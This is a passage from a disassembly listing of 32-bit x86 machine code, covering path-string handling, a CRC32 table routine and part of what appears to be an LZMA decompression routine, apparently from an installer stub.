  40651b:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  40651f:	75 03                	jne    0x406524
  406521:	83 c6 04             	add    $0x4,%esi
  406524:	80 3e 00             	cmpb   $0x0,(%esi)
  406527:	74 0c                	je     0x406535
  406529:	56                   	push   %esi
  40652a:	e8 fe f6 ff ff       	call   0x405c2d
  40652f:	85 c0                	test   %eax,%eax
  406531:	74 02                	je     0x406535
  406533:	46                   	inc    %esi
  406534:	46                   	inc    %esi
  406535:	8a 06                	mov    (%esi),%al
  406537:	8b de                	mov    %esi,%ebx
  406539:	84 c0                	test   %al,%al
  40653b:	8b fe                	mov    %esi,%edi
  40653d:	74 39                	je     0x406578
  40653f:	55                   	push   %ebp
  406540:	8b 2d 10 82 40 00    	mov    0x408210,%ebp
  406546:	3c 1f                	cmp    $0x1f,%al
  406548:	76 22                	jbe    0x40656c
  40654a:	50                   	push   %eax
  40654b:	68 08 a4 40 00       	push   $0x40a408
  406550:	e8 96 f6 ff ff       	call   0x405beb
  406555:	80 38 00             	cmpb   $0x0,(%eax)
  406558:	75 12                	jne    0x40656c
  40655a:	56                   	push   %esi
  40655b:	ff d5                	call   *%ebp
  40655d:	2b c6                	sub    %esi,%eax
  40655f:	50                   	push   %eax
  406560:	56                   	push   %esi
  406561:	57                   	push   %edi
  406562:	e8 15 f8 ff ff       	call   0x405d7c
  406567:	57                   	push   %edi
  406568:	ff d5                	call   *%ebp
  40656a:	8b f8                	mov    %eax,%edi
  40656c:	56                   	push   %esi
  40656d:	ff d5                	call   *%ebp
  40656f:	8b f0                	mov    %eax,%esi
  406571:	8a 06                	mov    (%esi),%al
  406573:	84 c0                	test   %al,%al
  406575:	75 cf                	jne    0x406546
  406577:	5d                   	pop    %ebp
  406578:	80 27 00             	andb   $0x0,(%edi)
  40657b:	57                   	push   %edi
  40657c:	53                   	push   %ebx
  40657d:	ff 15 8c 81 40 00    	call   *0x40818c
  406583:	8b f8                	mov    %eax,%edi
  406585:	8a 07                	mov    (%edi),%al
  406587:	3c 20                	cmp    $0x20,%al
  406589:	74 04                	je     0x40658f
  40658b:	3c 5c                	cmp    $0x5c,%al
  40658d:	75 07                	jne    0x406596
  40658f:	80 27 00             	andb   $0x0,(%edi)
  406592:	3b df                	cmp    %edi,%ebx
  406594:	72 e5                	jb     0x40657b
  406596:	5f                   	pop    %edi
  406597:	5e                   	pop    %esi
  406598:	5b                   	pop    %ebx
  406599:	c2 04 00             	ret    $0x4
  40659c:	56                   	push   %esi
  40659d:	be a0 25 42 00       	mov    $0x4225a0,%esi
  4065a2:	56                   	push   %esi
  4065a3:	ff 74 24 0c          	push   0xc(%esp)
  4065a7:	ff 15 5c 81 40 00    	call   *0x40815c
  4065ad:	83 f8 ff             	cmp    $0xffffffff,%eax
  4065b0:	74 0b                	je     0x4065bd
  4065b2:	50                   	push   %eax
  4065b3:	ff 15 40 81 40 00    	call   *0x408140
  4065b9:	8b c6                	mov    %esi,%eax
  4065bb:	eb 02                	jmp    0x4065bf
  4065bd:	33 c0                	xor    %eax,%eax
  4065bf:	5e                   	pop    %esi
  4065c0:	c2 04 00             	ret    $0x4
  4065c3:	55                   	push   %ebp
  4065c4:	8b ec                	mov    %esp,%ebp
  4065c6:	81 ec 20 01 00 00    	sub    $0x120,%esp
  4065cc:	56                   	push   %esi
  4065cd:	be 04 01 00 00       	mov    $0x104,%esi
  4065d2:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4065d8:	56                   	push   %esi
  4065d9:	50                   	push   %eax
  4065da:	ff 15 7c 80 40 00    	call   *0x40807c
  4065e0:	3b c6                	cmp    %esi,%eax
  4065e2:	5e                   	pop    %esi
  4065e3:	76 02                	jbe    0x4065e7
  4065e5:	33 c0                	xor    %eax,%eax
  4065e7:	85 c0                	test   %eax,%eax
  4065e9:	74 0e                	je     0x4065f9
  4065eb:	80 bc 05 df fe ff ff 	cmpb   $0x5c,-0x121(%ebp,%eax,1)
  4065f2:	5c 
  4065f3:	74 04                	je     0x4065f9
  4065f5:	33 c9                	xor    %ecx,%ecx
  4065f7:	eb 03                	jmp    0x4065fc
  4065f9:	33 c9                	xor    %ecx,%ecx
  4065fb:	41                   	inc    %ecx
  4065fc:	ff 75 08             	push   0x8(%ebp)
  4065ff:	8d 89 14 a0 40 00    	lea    0x40a014(%ecx),%ecx
  406605:	8d 84 05 e0 fe ff ff 	lea    -0x120(%ebp,%eax,1),%eax
  40660c:	51                   	push   %ecx
  40660d:	68 14 a4 40 00       	push   $0x40a414
  406612:	50                   	push   %eax
  406613:	ff 15 34 82 40 00    	call   *0x408234
  406619:	83 c4 10             	add    $0x10,%esp
  40661c:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  406622:	6a 08                	push   $0x8
  406624:	6a 00                	push   $0x0
  406626:	50                   	push   %eax
  406627:	ff 15 30 81 40 00    	call   *0x408130
  40662d:	c9                   	leave
  40662e:	c2 04 00             	ret    $0x4
  406631:	8b 44 24 04          	mov    0x4(%esp),%eax
  406635:	56                   	push   %esi
  406636:	8b f0                	mov    %eax,%esi
  406638:	57                   	push   %edi
  406639:	c1 e6 03             	shl    $0x3,%esi
  40663c:	8b be 58 a2 40 00    	mov    0x40a258(%esi),%edi
  406642:	57                   	push   %edi
  406643:	ff 15 54 81 40 00    	call   *0x408154
  406649:	85 c0                	test   %eax,%eax
  40664b:	75 0a                	jne    0x406657
  40664d:	57                   	push   %edi
  40664e:	e8 70 ff ff ff       	call   0x4065c3
  406653:	85 c0                	test   %eax,%eax
  406655:	74 0f                	je     0x406666
  406657:	ff b6 5c a2 40 00    	push   0x40a25c(%esi)
  40665d:	50                   	push   %eax
  40665e:	ff 15 78 80 40 00    	call   *0x408078
  406664:	eb 02                	jmp    0x406668
  406666:	33 c0                	xor    %eax,%eax
  406668:	5f                   	pop    %edi
  406669:	5e                   	pop    %esi
  40666a:	c2 04 00             	ret    $0x4
  40666d:	55                   	push   %ebp
  40666e:	8b ec                	mov    %esp,%ebp
  406670:	83 ec 1c             	sub    $0x1c,%esp
  406673:	56                   	push   %esi
  406674:	8b 75 08             	mov    0x8(%ebp),%esi
  406677:	57                   	push   %edi
  406678:	8b 3d 94 81 40 00    	mov    0x408194,%edi
  40667e:	eb 0a                	jmp    0x40668a
  406680:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406683:	50                   	push   %eax
  406684:	ff 15 98 81 40 00    	call   *0x408198
  40668a:	6a 01                	push   $0x1
  40668c:	56                   	push   %esi
  40668d:	56                   	push   %esi
  40668e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406691:	6a 00                	push   $0x0
  406693:	50                   	push   %eax
  406694:	ff d7                	call   *%edi
  406696:	85 c0                	test   %eax,%eax
  406698:	75 e6                	jne    0x406680
  40669a:	5f                   	pop    %edi
  40669b:	5e                   	pop    %esi
  40669c:	c9                   	leave
  40669d:	c2 04 00             	ret    $0x4
  4066a0:	ff 25 78 80 40 00    	jmp    *0x408078
  4066a6:	55                   	push   %ebp
  4066a7:	8b ec                	mov    %esp,%ebp
  4066a9:	51                   	push   %ecx
  4066aa:	56                   	push   %esi
  4066ab:	8b 35 74 80 40 00    	mov    0x408074,%esi
  4066b1:	57                   	push   %edi
  4066b2:	6a 64                	push   $0x64
  4066b4:	ff 75 08             	push   0x8(%ebp)
  4066b7:	ff d6                	call   *%esi
  4066b9:	bf 02 01 00 00       	mov    $0x102,%edi
  4066be:	eb 0e                	jmp    0x4066ce
  4066c0:	6a 0f                	push   $0xf
  4066c2:	e8 a6 ff ff ff       	call   0x40666d
  4066c7:	6a 64                	push   $0x64
  4066c9:	ff 75 08             	push   0x8(%ebp)
  4066cc:	ff d6                	call   *%esi
  4066ce:	3b c7                	cmp    %edi,%eax
  4066d0:	74 ee                	je     0x4066c0
  4066d2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4066d5:	50                   	push   %eax
  4066d6:	ff 75 08             	push   0x8(%ebp)
  4066d9:	ff 15 70 80 40 00    	call   *0x408070
  4066df:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4066e2:	5f                   	pop    %edi
  4066e3:	5e                   	pop    %esi
  4066e4:	c9                   	leave
  4066e5:	c2 04 00             	ret    $0x4
  4066e8:	83 3d e4 32 42 00 00 	cmpl   $0x0,0x4232e4
  4066ef:	56                   	push   %esi
  4066f0:	75 2d                	jne    0x40671f
  4066f2:	33 c9                	xor    %ecx,%ecx
  4066f4:	6a 08                	push   $0x8
  4066f6:	8b c1                	mov    %ecx,%eax
  4066f8:	5e                   	pop    %esi
  4066f9:	8b d0                	mov    %eax,%edx
  4066fb:	80 e2 01             	and    $0x1,%dl
  4066fe:	f6 da                	neg    %dl
  406700:	1b d2                	sbb    %edx,%edx
  406702:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406708:	d1 e8                	shr    $1,%eax
  40670a:	33 c2                	xor    %edx,%eax
  40670c:	4e                   	dec    %esi
  40670d:	75 ea                	jne    0x4066f9
  40670f:	89 04 8d e0 32 42 00 	mov    %eax,0x4232e0(,%ecx,4)
  406716:	41                   	inc    %ecx
  406717:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40671d:	7c d5                	jl     0x4066f4
  40671f:	8b 54 24 10          	mov    0x10(%esp),%edx
  406723:	8b 44 24 08          	mov    0x8(%esp),%eax
  406727:	85 d2                	test   %edx,%edx
  406729:	f7 d0                	not    %eax
  40672b:	76 23                	jbe    0x406750
  40672d:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406731:	57                   	push   %edi
  406732:	0f b6 39             	movzbl (%ecx),%edi
  406735:	8b f0                	mov    %eax,%esi
  406737:	81 e6 ff 00 00 00    	and    $0xff,%esi
  40673d:	33 f7                	xor    %edi,%esi
  40673f:	c1 e8 08             	shr    $0x8,%eax
  406742:	8b 34 b5 e0 32 42 00 	mov    0x4232e0(,%esi,4),%esi
  406749:	33 c6                	xor    %esi,%eax
  40674b:	41                   	inc    %ecx
  40674c:	4a                   	dec    %edx
  40674d:	75 e3                	jne    0x406732
  40674f:	5f                   	pop    %edi
  406750:	f7 d0                	not    %eax
  406752:	5e                   	pop    %esi
  406753:	c2 0c 00             	ret    $0xc
  406756:	b8 80 00 00 00       	mov    $0x80,%eax
  40675b:	48                   	dec    %eax
  40675c:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406760:	75 f9                	jne    0x40675b
  406762:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406766:	33 c0                	xor    %eax,%eax
  406768:	40                   	inc    %eax
  406769:	89 41 68             	mov    %eax,0x68(%ecx)
  40676c:	89 41 64             	mov    %eax,0x64(%ecx)
  40676f:	89 41 60             	mov    %eax,0x60(%ecx)
  406772:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406775:	c3                   	ret
  406776:	55                   	push   %ebp
  406777:	8b ec                	mov    %esp,%ebp
  406779:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40677f:	53                   	push   %ebx
  406780:	56                   	push   %esi
  406781:	57                   	push   %edi
  406782:	6a 22                	push   $0x22
  406784:	8b f1                	mov    %ecx,%esi
  406786:	59                   	pop    %ecx
  406787:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  40678d:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406793:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406795:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406799:	75 08                	jne    0x4067a3
  40679b:	33 c0                	xor    %eax,%eax
  40679d:	40                   	inc    %eax
  40679e:	e9 20 0a 00 00       	jmp    0x4071c3
  4067a3:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  4067a6:	8b 75 ac             	mov    -0x54(%ebp),%esi
  4067a9:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  4067af:	83 f8 1c             	cmp    $0x1c,%eax
  4067b2:	0f 87 08 0a 00 00    	ja     0x4071c0
  4067b8:	ff 24 85 c8 71 40 00 	jmp    *0x4071c8(,%eax,4)
  4067bf:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4067c3:	0f 84 e2 09 00 00    	je     0x4071ab
  4067c9:	8b 45 90             	mov    -0x70(%ebp),%eax
  4067cc:	ff 4d 94             	decl   -0x6c(%ebp)
  4067cf:	ff 45 90             	incl   -0x70(%ebp)
  4067d2:	8a 00                	mov    (%eax),%al
  4067d4:	3c e1                	cmp    $0xe1,%al
  4067d6:	0f 87 e4 09 00 00    	ja     0x4071c0
  4067dc:	0f b6 c0             	movzbl %al,%eax
  4067df:	6a 2d                	push   $0x2d
  4067e1:	99                   	cltd
  4067e2:	59                   	pop    %ecx
  4067e3:	f7 f9                	idiv   %ecx
  4067e5:	6a 09                	push   $0x9
  4067e7:	59                   	pop    %ecx
  4067e8:	8b f0                	mov    %eax,%esi
  4067ea:	0f b6 c2             	movzbl %dl,%eax
  4067ed:	99                   	cltd
  4067ee:	f7 f9                	idiv   %ecx
  4067f0:	8b ce                	mov    %esi,%ecx
  4067f2:	0f b6 fa             	movzbl %dl,%edi
  4067f5:	33 d2                	xor    %edx,%edx
  4067f7:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4067fa:	42                   	inc    %edx
  4067fb:	d3 e2                	shl    %cl,%edx
  4067fd:	8b c8                	mov    %eax,%ecx
  4067ff:	4a                   	dec    %edx
  406800:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406803:	33 d2                	xor    %edx,%edx
  406805:	42                   	inc    %edx
  406806:	d3 e2                	shl    %cl,%edx
  406808:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  40680b:	be 00 03 00 00       	mov    $0x300,%esi
  406810:	d3 e6                	shl    %cl,%esi
  406812:	4a                   	dec    %edx
  406813:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406816:	81 c6 36 07 00 00    	add    $0x736,%esi
  40681c:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  40681f:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406822:	74 26                	je     0x40684a
  406824:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406828:	74 09                	je     0x406833
  40682a:	ff 75 fc             	push   -0x4(%ebp)
  40682d:	ff 15 24 81 40 00    	call   *0x408124
  406833:	57                   	push   %edi
  406834:	6a 40                	push   $0x40
  406836:	ff 15 28 81 40 00    	call   *0x408128
  40683c:	85 c0                	test   %eax,%eax
  40683e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406841:	0f 84 79 09 00 00    	je     0x4071c0
  406847:	89 7d 88             	mov    %edi,-0x78(%ebp)
  40684a:	85 f6                	test   %esi,%esi
  40684c:	74 0c                	je     0x40685a
  40684e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406851:	4e                   	dec    %esi
  406852:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406858:	75 f4                	jne    0x40684e
  40685a:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  40685e:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406862:	eb 26                	jmp    0x40688a
  406864:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406868:	0f 84 a6 08 00 00    	je     0x407114
  40686e:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406871:	ff 4d 94             	decl   -0x6c(%ebp)
  406874:	8b c8                	mov    %eax,%ecx
  406876:	8b 45 90             	mov    -0x70(%ebp),%eax
  406879:	c1 e1 03             	shl    $0x3,%ecx
  40687c:	0f b6 00             	movzbl (%eax),%eax
  40687f:	d3 e0                	shl    %cl,%eax
  406881:	09 45 c0             	or     %eax,-0x40(%ebp)
  406884:	ff 45 90             	incl   -0x70(%ebp)
  406887:	ff 45 b8             	incl   -0x48(%ebp)
  40688a:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  40688e:	7c d4                	jl     0x406864
  406890:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406893:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406896:	74 28                	je     0x4068c0
  406898:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40689c:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40689f:	74 09                	je     0x4068aa
  4068a1:	ff 75 f8             	push   -0x8(%ebp)
  4068a4:	ff 15 24 81 40 00    	call   *0x408124
  4068aa:	ff 75 c0             	push   -0x40(%ebp)
  4068ad:	6a 40                	push   $0x40
  4068af:	ff 15 28 81 40 00    	call   *0x408128
  4068b5:	85 c0                	test   %eax,%eax
  4068b7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4068ba:	0f 84 00 09 00 00    	je     0x4071c0
  4068c0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4068c3:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  4068c6:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  4068cd:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  4068d2:	eb 21                	jmp    0x4068f5
  4068d4:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4068d8:	0f 84 45 08 00 00    	je     0x407123
  4068de:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4068e1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4068e4:	ff 4d 94             	decl   -0x6c(%ebp)
  4068e7:	0f b6 09             	movzbl (%ecx),%ecx
  4068ea:	c1 e0 08             	shl    $0x8,%eax
  4068ed:	0b c1                	or     %ecx,%eax
  4068ef:	ff 45 90             	incl   -0x70(%ebp)
  4068f2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4068f5:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4068f8:	ff 4d b8             	decl   -0x48(%ebp)
  4068fb:	85 c0                	test   %eax,%eax
  4068fd:	75 d5                	jne    0x4068d4
  4068ff:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406902:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406905:	23 45 e4             	and    -0x1c(%ebp),%eax
  406908:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  40690f:	00 00 00 
  406912:	c1 e1 04             	shl    $0x4,%ecx
  406915:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406918:	03 c8                	add    %eax,%ecx
  40691a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40691d:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406920:	e9 6c 06 00 00       	jmp    0x406f91
  406925:	33 d2                	xor    %edx,%edx
  406927:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  40692a:	75 6f                	jne    0x40699b
  40692c:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406930:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406933:	b1 08                	mov    $0x8,%cl
  406935:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406938:	23 75 e8             	and    -0x18(%ebp),%esi
  40693b:	d3 e8                	shr    %cl,%eax
  40693d:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406940:	d3 e6                	shl    %cl,%esi
  406942:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406945:	03 c6                	add    %esi,%eax
  406947:	8d 04 40             	lea    (%eax,%eax,2),%eax
  40694a:	c1 e0 09             	shl    $0x9,%eax
  40694d:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406951:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406958:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40695b:	7d 05                	jge    0x406962
  40695d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406960:	eb 10                	jmp    0x406972
  406962:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406966:	7d 06                	jge    0x40696e
  406968:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  40696c:	eb 04                	jmp    0x406972
  40696e:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406972:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406975:	74 1c                	je     0x406993
  406977:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40697a:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40697d:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406980:	72 03                	jb     0x406985
  406982:	03 45 8c             	add    -0x74(%ebp),%eax
  406985:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406988:	33 db                	xor    %ebx,%ebx
  40698a:	43                   	inc    %ebx
  40698b:	8a 04 08             	mov    (%eax,%ecx,1),%al
  40698e:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406991:	eb 68                	jmp    0x4069fb
  406993:	33 db                	xor    %ebx,%ebx
  406995:	43                   	inc    %ebx
  406996:	e9 cd 01 00 00       	jmp    0x406b68
  40699b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40699e:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4069a1:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  4069a8:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  4069af:	00 00 00 
  4069b2:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  4069b9:	e9 d3 05 00 00       	jmp    0x406f91
  4069be:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4069c2:	0f 84 67 07 00 00    	je     0x40712f
  4069c8:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4069cb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4069ce:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4069d2:	0f b6 09             	movzbl (%ecx),%ecx
  4069d5:	ff 4d 94             	decl   -0x6c(%ebp)
  4069d8:	c1 e0 08             	shl    $0x8,%eax
  4069db:	0b c1                	or     %ecx,%eax
  4069dd:	ff 45 90             	incl   -0x70(%ebp)
  4069e0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4069e3:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4069e6:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4069e9:	0f 85 ad 00 00 00    	jne    0x406a9c
  4069ef:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4069f5:	0f 8d 05 01 00 00    	jge    0x406b00
  4069fb:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  4069ff:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406a02:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406a05:	c1 e8 07             	shr    $0x7,%eax
  406a08:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406a0b:	40                   	inc    %eax
  406a0c:	c1 e0 08             	shl    $0x8,%eax
  406a0f:	03 c3                	add    %ebx,%eax
  406a11:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406a14:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406a17:	c1 e9 0b             	shr    $0xb,%ecx
  406a1a:	66 8b 06             	mov    (%esi),%ax
  406a1d:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406a20:	0f b7 d0             	movzwl %ax,%edx
  406a23:	0f af ca             	imul   %edx,%ecx
  406a26:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406a29:	73 1a                	jae    0x406a45
  406a2b:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406a2f:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406a32:	b9 00 08 00 00       	mov    $0x800,%ecx
  406a37:	2b ca                	sub    %edx,%ecx
  406a39:	c1 f9 05             	sar    $0x5,%ecx
  406a3c:	03 c8                	add    %eax,%ecx
  406a3e:	03 db                	add    %ebx,%ebx
  406a40:	66 89 0e             	mov    %cx,(%esi)
  406a43:	eb 1d                	jmp    0x406a62
  406a45:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406a48:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406a4b:	66 8b c8             	mov    %ax,%cx
  406a4e:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406a55:	66 c1 e9 05          	shr    $0x5,%cx
  406a59:	2b c1                	sub    %ecx,%eax
  406a5b:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406a5f:	66 89 06             	mov    %ax,(%esi)
  406a62:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406a69:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406a6c:	0f 83 71 ff ff ff    	jae    0x4069e3
  406a72:	e9 47 ff ff ff       	jmp    0x4069be
  406a77:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406a7b:	0f 84 ba 06 00 00    	je     0x40713b
  406a81:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406a84:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406a87:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406a8b:	0f b6 09             	movzbl (%ecx),%ecx
  406a8e:	ff 4d 94             	decl   -0x6c(%ebp)
  406a91:	c1 e0 08             	shl    $0x8,%eax
  406a94:	0b c1                	or     %ecx,%eax
  406a96:	ff 45 90             	incl   -0x70(%ebp)
  406a99:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406a9c:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406aa2:	7d 5c                	jge    0x406b00
  406aa4:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406aa7:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406aaa:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406aad:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406ab0:	c1 e9 0b             	shr    $0xb,%ecx
  406ab3:	66 8b 06             	mov    (%esi),%ax
  406ab6:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406ab9:	0f b7 f8             	movzwl %ax,%edi
  406abc:	0f af cf             	imul   %edi,%ecx
  406abf:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406ac2:	73 16                	jae    0x406ada
  406ac4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406ac7:	b9 00 08 00 00       	mov    $0x800,%ecx
  406acc:	2b cf                	sub    %edi,%ecx
  406ace:	c1 f9 05             	sar    $0x5,%ecx
  406ad1:	03 c8                	add    %eax,%ecx
  406ad3:	03 db                	add    %ebx,%ebx
  406ad5:	66 89 0e             	mov    %cx,(%esi)
  406ad8:	eb 15                	jmp    0x406aef
  406ada:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406add:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406ae0:	66 8b c8             	mov    %ax,%cx
  406ae3:	8d 5a 01             	lea    0x1(%edx),%ebx
  406ae6:	66 c1 e9 05          	shr    $0x5,%cx
  406aea:	2b c1                	sub    %ecx,%eax
  406aec:	66 89 06             	mov    %ax,(%esi)
  406aef:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406af6:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406af9:	73 a1                	jae    0x406a9c
  406afb:	e9 77 ff ff ff       	jmp    0x406a77
  406b00:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406b04:	8a 45 bc             	mov    -0x44(%ebp),%al
  406b07:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406b0a:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406b0e:	0f 84 3f 06 00 00    	je     0x407153
  406b14:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406b17:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406b1a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406b1d:	ff 45 a0             	incl   -0x60(%ebp)
  406b20:	ff 45 98             	incl   -0x68(%ebp)
  406b23:	ff 4d 9c             	decl   -0x64(%ebp)
  406b26:	88 01                	mov    %al,(%ecx)
  406b28:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406b2b:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406b2e:	8d 41 01             	lea    0x1(%ecx),%eax
  406b31:	33 d2                	xor    %edx,%edx
  406b33:	f7 75 8c             	divl   -0x74(%ebp)
  406b36:	e9 95 01 00 00       	jmp    0x406cd0
  406b3b:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406b3f:	0f 84 02 06 00 00    	je     0x407147
  406b45:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406b48:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406b4b:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406b4f:	0f b6 09             	movzbl (%ecx),%ecx
  406b52:	ff 4d 94             	decl   -0x6c(%ebp)
  406b55:	c1 e0 08             	shl    $0x8,%eax
  406b58:	0b c1                	or     %ecx,%eax
  406b5a:	ff 45 90             	incl   -0x70(%ebp)
  406b5d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406b60:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406b66:	7d 9c                	jge    0x406b04
  406b68:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406b6b:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406b6e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406b71:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406b74:	c1 e9 0b             	shr    $0xb,%ecx
  406b77:	66 8b 06             	mov    (%esi),%ax
  406b7a:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406b7d:	0f b7 f8             	movzwl %ax,%edi
  406b80:	0f af cf             	imul   %edi,%ecx
  406b83:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406b86:	73 16                	jae    0x406b9e
  406b88:	89 4d f0             	mov    %ecx,-0x10(%ebp)
